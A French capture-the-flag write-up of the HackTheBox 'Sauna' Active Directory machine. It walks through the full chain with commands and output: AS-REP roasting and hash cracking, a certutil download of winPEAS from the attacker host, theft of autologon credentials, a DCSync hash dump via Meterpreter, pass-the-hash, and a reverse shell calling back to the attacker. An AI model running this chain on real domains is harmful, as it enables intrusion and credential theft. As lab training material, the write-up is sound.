## Desc
Sauna est une machine Windows facile à utiliser qui permet l'énumération et l'exploitation d'Active Directory. Les noms d'utilisateur possibles peuvent être dérivés des noms complets des employés figurant sur le site Web. Avec ces noms d'utilisateur, une attaque `ASREPRoasting` peut être effectuée, ce qui permet d'obtenir un hachage pour un compte qui ne nécessite pas de préauthentification Kerberos. Ce hachage peut être soumis à une attaque par force brute hors ligne, afin de récupérer le mot de passe en clair d'un utilisateur capable d'accéder à la boîte par WinRM. L'exécution de WinPEAS révèle qu'un autre utilisateur du système a été configuré pour se connecter automatiquement et qu'il identifie son mot de passe. Ce deuxième utilisateur dispose également d'autorisations de gestion à distance de Windows. BloodHound révèle que cet utilisateur dispose du droit étendu *DS-Replication-Get-Changes-All*, ce qui lui permet d'extraire les hachages de mots de passe du contrôleur de domaine dans le cadre d'une attaque DCSync. L'exécution de cette attaque renvoie le hash de l'administrateur principal du domaine, qui peut être utilisé avec `psexec.py` d'Impacket&amp;amp;#039;afin d'obtenir un shell sur la machine en tant que `NT_AUTHORITY\SYSTEM`.

## Recon
On debute par notre scan automatisee
```
└─# /home/blo/tools/nmapautomate/nmapauto.sh 10.129.95.180
Completed SYN Stealth Scan at 17:33, 23.97s elapsed (1000 total ports)
Nmap scan report for 10.129.95.180
Host is up (0.32s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
           Raw packets sent: 2002 (88.064KB) | Rcvd: 23 (996B)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,80,88,135,139,389,445,464,593,636,3268,3269   
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Microsoft IIS httpd 10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.79 seconds
           Raw packets sent: 131128 (5.770MB) | Rcvd: 130 (5.704KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,80,135,139,445                     
```
- On a un site disponible au port `80`, le kerberoas qui nous confirme que nous somme sur un Active Directory, et on a les ports `SMB` et `msrpc` ouvert
Un second scan toujours
```
└─# nmap -sV -sC -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269 10.129.95.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-24 17:37 CST
Nmap scan report for 10.129.95.180
Host is up (0.48s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-25 06:37:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-25T06:38:04
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Ici je trouve le domain `EGOTISTICAL-BANK.LOCAL0` et le DC `SAUNA.EGOTISTICAL-BANK.LOCAL0`
```
└─# echo "$ip  $host $host2" | tee -a /etc/hosts        
10.129.95.180  EGOTISTICAL-BANK.LOCAL SAUNA.EGOTISTICAL-BANK.LOCAL

```

Pour commencer, visitons le site web
- Dans le `http://10.129.95.180/about.html#team` je trouve les noms de tous leurs equipiers.  Donc quoi faire ?
- Je compte ecrire ces users, ensuite essayer l'attaque `ASREPRoasting` pour trouver un utilisateur qui ne necessite pas de pre-authentification kerberoas.
Nous avons ici les noms des employés, avec leurs noms d'utilisateur supposés. Notez que si nous n'obtenons qu'une liste de membres (et non de noms d'utilisateur), nous pouvons utiliser l'outil `namemash.py` pour créer une liste de noms d'utilisateur. ensuite lancer `kerbrute` pour avoir les users valids au kerberoas

```
└─# python3 namemash.py users.txt > users     
                                                                                                                                                                                            
┌──(venv)─(root㉿xXxX)-[/home/blo/CTFs/Boot2root/HTB]
└─# wc users 
 66  66 584 users
```

Ensuite le `kerbrute`
```
└─# kerbrute userenum --dc 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL  users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/24/24 - Ronnie Flathers @ropnop

2024/02/24 17:52:36 >  Using KDC(s):
2024/02/24 17:52:36 >   10.129.95.180:88

2024/02/24 17:52:36 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

on a un utilisateur valide mais sans mot de passe.
Avec `nxc` je trouve aussi que l'anonymous access est autorisee sur le smb
```
└─# nxc smb 10.129.95.180 -u '' -p ''
SMB         10.129.95.180   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 

└─# rpcclient -U '' -N 10.129.95.180
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

Avec l'utilisateur qu'on a eu dans le kerberoas, lancons notre attaque `ASREPRoasting`
```
└─# impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile user -dc-ip 10.129.95.180
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ae2a7dbc90fa0eac1bef188810a48c41$1ff71d9b643d803bdb88a2f5a0aa3e525900206659a477a8ba24635b9127c30c4f93854d1149f2c6436038c88f0d03060e850544fe5dd7161d7d3211dbf6d2e90deeaf212b87792c2f00fca060a599279b631fb81ae9a234efad02aa40aa9878b80434fa7c4efc682e2ed4156b3908da0d7368190c8851b35859bcc0267b694950479a45d141490d26e65dc10cc7a07f93792affd6ff860175ac332e9ef3330568a438991f27cc88aee475cbc5b4a5c02b6dffd278c7d2c22a055ff84f8881a7c7d6b75d0b5fcb4656422e00f0a4e1a1ea7909e5728b21f38484701a5f3a52ce5e16bb9d073fd5ab8601663592d4d0e0362ede82ce78f2cfaca23f546e2f9b50
```
Bien reussi, Let's crack now
```
└─# hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ae2a7dbc90fa0eac1bef188810a48c41$1ff71d9b643d803bdb88a2f5a0aa3e525900206659a477a8ba24635b9127c30c4f93854d1149f2c6436038c88f0d03060e850544fe5dd7161d7d3211dbf6d2e90deeaf212b87792c2f00fca060a599279b631fb81ae9a234efad02aa40aa9878b80434fa7c4efc682e2ed4156b3908da0d7368190c8851b35859bcc0267b694950479a45d141490d26e65dc10cc7a07f93792affd6ff860175ac332e9ef3330568a438991f27cc88aee475cbc5b4a5c02b6dffd278c7d2c22a055ff84f8881a7c7d6b75d0b5fcb4656422e00f0a4e1a1ea7909e5728b21f38484701a5f3a52ce5e16bb9d073fd5ab8601663592d4d0e0362ede82ce78f2cfaca23f546e2f9b50:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ae2a7db...2f9b50
Time.Started.....: Sat Feb 24 18:01:09 2024 (6 secs)
Time.Estimated...: Sat Feb 24 18:01:15 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1804.9 kH/s (1.71ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344387 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344387 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tionna2011 -> Thelma!
Hardware.Mon.#1..: Temp: 38c Util: 62%

```
Avec hashcat,  j'ai pu cracker ce hash en des seconde, maintenant quoi faire avec un user et un password
**SMB**
```
└─# nxc smb 10.129.95.180 -u 'fsmith' -p 'Thestrokes23'
SMB         10.129.95.180   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
```
Les creds son't valides deja 
```
└─# rpcclient -U 'fsmith'  10.129.95.180 
Password for [WORKGROUP\fsmith]:
rpcclient $> enumdomains
name:[EGOTISTICALBANK] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]
```
Avec cet utilisateur, j'ai pu avoir les autres, alors je vais relancer la meme attaque pour voir si j'aurai un autre utilisateur vulnerable
- Nonnn ca marche pas avec eux
**Connexion**
```
└─# nc -nv 10.129.95.180 5985
(UNKNOWN) [10.129.95.180] 5985 (?) open
```
On peux se connecter avec evil-winrm
```
└─# evil-winrm -i $ip -u fsmith -p 'Thestrokes23'       
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
dcf6c2c67fe0e3a9898cf8e1bd4ee87f
```

## Privilege escalation
Pour le privilege escalation, comme je suis dans un active Directory je vais d'abord  utiliser bloodhound 
```
bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u fsmith -p 'Thestrokes23' -ns 10.129.95.180 -c All
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Conne
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 01M 45S
```
Et maintenant nos fichier `json` dans le bloodhound
Avec bloodhound je vois pas assez d'infos.
Let's run winPEAS

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> certutil -urlcache -f http://10.10.16.2/winPEASany.exe winPEASany.exe
****  Online  ****
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASany.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```

En bas je trouve un `AutoLogon Creds` de `svc_loanmanager` qui peut se connecter automatiquement sur la machine
Je vais check cet utilisateur sur `nxc`
```
└─# nxc smb 10.129.95.180 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.129.95.180   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
```
Un autre utilisateur pwned, je vais voir sur bloodhound avec cet utilisateur

- Avec cet utilisateur je peux faire une attaque de `DCSync` pour avoir le mot de passe ntlm d'un utilisateur avec `mimikatz.exe`
`lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:HSmith`
- Je peux aussi le faire avec `Metasploit` avec le load kiwi
```
load kiwi
dcsync_ntlm krbtgt
dcsync krbtgt
```
- https://www.hackingarticles.in/credential-dumping-dcsync-attack/

```
# evil-winrm -i $ip -u svc_loanmgr -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```
Je vois bien que mon user est dans les groupe `NT AUTHORITY` je vais utiliser `Metasploit` pour dump les hash ntlm

```
meterpreter > load kiwi 
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > meterpreter > dcsync_ntlm administrator
[+] Account   : administrator
[+] NTLM Hash : 823452073d75b9d1cf70ebdf86c7f98e
[+] LM Hash   : 365ca60e4aba3e9a71d78a3912caf35c
[+] SID       : S-1-5-21-2966785786-3096785034-1186376766-500
[+] RID       : 500

```
Et maintenant j'ai le hash `ntlm` de l'admin. Donc quoi faire
- Je peux utiliser le Pass-the-Hash pour me conneceter
```
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/bloodhound]
└─# nxc smb 10.129.95.180 -u 'Administrator' -H 823452073d75b9d1cf70ebdf86c7f98e 
SMB         10.129.95.180   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)


```
Maintenant je vais executer mon shell a partir de admin
```
└─# nxc smb 10.129.95.180 -u 'Administrator' -H 823452073d75b9d1cf70ebdf86c7f98e -x 'start C:\Users\svc_loanmgr\Documents\rev.exe'
SMB         10.129.95.180   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:1337 
[*] Sending stage (175686 bytes) to 10.129.95.180
[*] Meterpreter session 2 opened (10.10.16.2:1337 -> 10.129.95.180:50040) at 2024-02-24 19:26:31 -0600

meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ca9d447f787e9ec70b3fced86a23d262:::
meterpreter > 
C:\Users\Administrator\Desktop>type root.txt
type root.txt
17e3da540aac23eca77fee0238efc02d

```